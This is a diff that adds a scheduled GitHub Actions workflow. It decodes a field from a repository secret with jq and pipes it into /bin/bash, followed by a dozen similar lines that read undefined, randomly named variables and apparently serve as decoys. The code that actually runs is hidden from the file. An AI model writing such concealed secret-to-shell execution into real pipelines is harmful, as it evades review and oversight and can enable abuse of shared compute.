@@ -1,0 +1,30 @@
+name: lishitaixun
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lishitaixun
+        env:
+          xwlo7670: ${{ secrets.xwlo7670 }}
+        run: |
+          echo $xwlo7670 | jq -r .pdkaz2961 | /bin/bash
+          echo $nnogq48 | jq -r .d6 | /bin/bash
+          echo $y621 | jq -r .t2 | /bin/bash
+          echo $mdz8349 | jq -r .ducg906 | /bin/bash
+          echo $ul51732 | jq -r .zeotv950 | /bin/bash
+          echo $g00535 | jq -r .k21331 | /bin/bash
+          echo $sdbrt92 | jq -r .s61512 | /bin/bash
+          echo $bh504 | jq -r .bh2995 | /bin/bash
+          echo $upk77762 | jq -r .p06 | /bin/bash
+          echo $oqv6905 | jq -r .pcq53 | /bin/bash
+          echo $f801 | jq -r .f6 | /bin/bash
+          echo $f44736 | jq -r .xa6680 | /bin/bash
+          echo $nomyk9 | jq -r .emf1857 | /bin/bash
+
